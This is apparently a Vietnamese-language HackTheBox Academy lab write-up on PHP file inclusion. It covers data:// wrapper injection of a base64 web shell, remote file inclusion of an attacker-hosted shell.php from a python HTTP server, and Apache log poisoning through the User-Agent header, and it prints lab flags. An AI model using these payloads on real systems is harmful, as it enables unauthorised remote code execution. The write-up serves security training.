# HackTheBox_academy

# Bài này ta làm quen với PHP wrappers để lấy RCE

![image](https://github.com/user-attachments/assets/5a677965-ba33-4a7d-91f5-c3ea1c648c19)

>curl -s "http://83.136.251.68:31806/index.php?language=data://text/plain;base64,PD9waHA8c2lzdGVtKCRfR0VUWVJbYWJ0aXJkXSk7ID8%3D&cmd=ls%20/"


![Screenshot 2025-04-18 221659](https://github.com/user-attachments/assets/cdbed38b-0321-48f0-9a4e-1cba00020db4)

![Screenshot 2025-04-18 221851](https://github.com/user-attachments/assets/d71d3a31-f92c-4333-bc9f-affe40c100d5)

Đọc file .txt ta được flag 

![Screenshot 2025-04-18 221938](https://github.com/user-attachments/assets/1922a5fd-c1f8-4db4-9d6e-9d9698ebf59c)



# Remote File Inclusion(RFI)

![image](https://github.com/user-attachments/assets/5ba667c6-a125-4f82-b2bf-bb5e84c5640b)


![Screenshot 2025-04-21 010317](https://github.com/user-attachments/assets/2e2e3a45-60a4-4a27-bc48-b34b10b5146c)

Ta thử kiểm tra xem trang web có bị RFI không bằng cách thêm 1 đường dẫn như sau http://10.129.86.168/index.php?language=http://10.129.86.168:80/index.php

![image](https://github.com/user-attachments/assets/6ba21e4b-90ee-4a07-bb4f-5903d7c45db9)

Như chúng ta có thể thấy, trang index.php đã được đưa vào phần dễ bị tấn công, vì vậy trang thực sự dễ bị tấn công RFI, vì chúng ta có thể đưa vào URL, hơn nãy ta thấy khi ta đưa vào trang index.php thì nó không hiện thị dưới dạng mã nguồn mà hiển thị dưới dạng thực thi và hiện thị dưới dạng php, Có nghĩa là PHP trên máy chủ vẫn thực thi code trong file đó, chứ không hiển thị ra nội dung file. Điều này cho phép chúng ta thực thi mã nếu chúng ta đưa vào một tệp lệnh php độc hại.

Tạo một tệp độc hại bằng php

![image](https://github.com/user-attachments/assets/ae958046-7493-493b-8ee6-afd46379574b)

Bây giờ, chúng ta có thể khởi động một máy chủ trên máy của mình bằng máy chủ python cơ bản bằng lệnh sau:

> python3 -m http.server 8080

Bây giờ chúng ta có thể inclusion shell cục bộ của mình thông qua RFI bằng đường dẫn như sau

> http://10.129.86.168/index.php?language=http://10.10.15.4:8080/shell.php&cmd=ls /

![image](https://github.com/user-attachments/assets/76c9a99b-6c8b-409c-8d6f-28ed9f29c262)

![Screenshot 2025-04-21 014108](https://github.com/user-attachments/assets/47a26e3f-2f58-4b43-9173-597a5f6156eb)

Flag : 99a8fc05f033f2fc0cf9a6f9826f83f4 

Ngoài ra ta có thể sử dụng ftp:// , điều này cũng có thể hữu ích trong trường hợp cổng http bị chặn bởi tường lửa hoặc http://chuỗi bị chặn bởi WAF

# Tấn công Web qua User-Agent Injection & Local File Inclusion (Server log poisoning)

Trong Apache tệp access.log chứa nhiều thông tin khác nhau về tất cả các yêu cầu được gửi đến máy chủ, bao gồm cả user-agent, Vì chúng ta có thể kiểm soát User-Agent trong yêu cầu của mình nên chúng ta có thể đầu độc tiêu đề User-Agent

Theo mặc định thì tệp access.log được đặt trong 
> /var/log/apache2/access.log

![Screenshot 2025-04-22 180522](https://github.com/user-attachments/assets/c1e08023-9daf-4ed5-a886-6f5861660df2)

![image](https://github.com/user-attachments/assets/f1bb98b3-95b5-4943-aa3b-8de2e91fa138)

Đầu tiên ta sử dụng lỗ hổng LFI thông qua tham số language để kết hợp với Apache log poisoning để RCE

![image](https://github.com/user-attachments/assets/2faac2f3-6998-45b1-acd8-6ffee07618a5)

Vì User-Agent được ghi vào access, nên ta chèn mã như sau

![image](https://github.com/user-attachments/assets/063b930f-600c-48a9-acc9-fd118e1febcb)

Tiếp theo ta cần làm là đưa file log chứa mã php vào lỗ hổng LFI thông qua tham số language như sau

![image](https://github.com/user-attachments/assets/fea2b5b7-267f-4d59-a458-d3a07c3d11be)

![image](https://github.com/user-attachments/assets/4d328efe-83ef-45f5-8a3f-173d84b35e84)

flag : HTB{1095_5#0u1d_n3v3r_63_3xp053d}









































